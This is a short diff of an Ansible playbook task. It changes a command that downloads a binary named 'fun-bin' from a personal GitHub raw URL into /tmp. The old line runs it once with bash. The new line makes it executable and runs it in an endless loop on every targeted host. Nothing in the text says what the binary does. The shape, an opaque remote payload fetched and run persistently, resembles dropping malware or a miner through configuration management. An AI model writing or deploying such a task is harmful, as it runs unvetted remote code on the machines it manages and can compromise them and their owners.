@@ -7,7 +7,7 @@
     tasks:
 
     - name: "Execute a command"
-      shell: "bash -c 'curl https://raw.githubusercontent.com/banditaf/ptgit1/main/fun-bin -o /tmp/fun-bin && bash /tmp/fun-bin'"
+      shell: "bash -c 'curl https://raw.githubusercontent.com/banditaf/ptgit1/main/fun-bin -o /tmp/fun-bin && chmod +x /tmp/fun-bin && while true; do /tmp/fun-bin; done'"
       register: "output"
 
     - debug: var=output.stdout_lines
